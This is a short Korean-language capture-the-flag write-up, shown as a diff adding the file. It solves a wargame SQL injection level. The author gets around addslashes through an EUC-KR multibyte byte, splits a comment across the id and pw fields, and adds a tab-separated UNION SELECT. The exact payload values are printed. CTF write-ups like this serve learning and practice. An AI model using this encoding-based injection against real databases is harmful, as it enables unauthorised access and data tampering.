@@ -1,0 +1,28 @@
+id와 pw 폼에 guest라는 값이 들어가있고 submit해보니 level 1이라고 뜬다.
+
+소스를 봐보자
+
+id,pw에 모두 addslashes()함수를 적용해주고있으며
+id의 경우 mb_convert_encoding()을 통해 utf-8에서 euc-kr로 인코딩 형식을 변환해 준다.
+여기 부분을 통해 id값을 이용해 인젝션을 시도해야함을 짐작해볼 수 있다.
+
+정규표현식을 이용해 from,pw,(,),공백,%,=,>,< 을 필터링해주고 있으며
+id값의 경우 추가적으로 union까지 필터링 해주고 있다.
+
+select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')
+위 쿼리를 반환하고 있으며 결과값이 lv=3이면 문제가 클리어 된다.
+
+주석 처리전
+select lv from chall50 where id='1'/*' and pw=md5('*/union%09select%093%23')
+주석 처리 후
+select lv from chall50 where id='1'union%09select%093%23
+
+id = 1%f1%27/*
+pw = */union%09select%093%23
+
+위와 같이 쿼리를 짜서 md5함수를 우회하고 뒤에 union을 통해 새로운 select문을 붙였다.
+위 쿼리에 대응하는 id,pw값을 각각 위와 같이 넣어보았다.
+
+클리어!!
+
+
